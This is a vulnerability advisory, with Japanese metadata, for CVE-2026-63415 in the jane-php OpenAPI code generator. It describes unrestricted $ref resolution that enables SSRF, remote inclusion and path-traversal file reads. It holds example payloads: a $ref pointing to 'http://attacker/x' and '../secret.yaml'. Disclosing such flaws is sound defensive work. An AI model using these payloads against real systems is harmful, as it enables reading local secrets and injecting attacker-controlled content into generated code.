# Jane\: \$ref resolution performs SSRF \+ LFI \(path traversal\) at code\-generation time \(jane\-php\)

- **ID**: CVE\-2026\-63415 / GHSA\-c3cj\-3p6p\-j822
- **危険度**: High（重要） (CVSS 7.0)
- **言語**: PHP
- **パッケージ**: Packagist/jane\-php/open\-api\-3 &lt; 7\.12\.0 → 7\.12\.0
- **公開**: 2026-11-18

## 原文

\#\#\# Summary jane\-php resolves external \`\$ref\` targets at code\-generation time via \`file\_get\_contents\(\$ref\)\` \(jane\-php/json\-schema\-runtime/Reference\.php\:\:doResolve\) with no scheme/path restriction\. An attacker\-controlled OpenAPI document can therefore cause\: \`\$ref\: 'http\://attacker/x'\` \-&gt; SSRF \(HTTP GET at gen time; response inlined \= RFI\); \`\$ref\: '/abs/file'\` \-&gt; LFI; \`\$ref\: '\.\./secret\.yaml'\` \-&gt; path\-traversal LFI \(CWE\-22, arbitrary local JSON/YAML read\)\. Verified 7\.11\.2/PHP8\.1 \(listener records the fetch; remote \+ \`\.\./\` local content inlined into the generated code\)\. \`file\://\` rejected\. CWE\-91
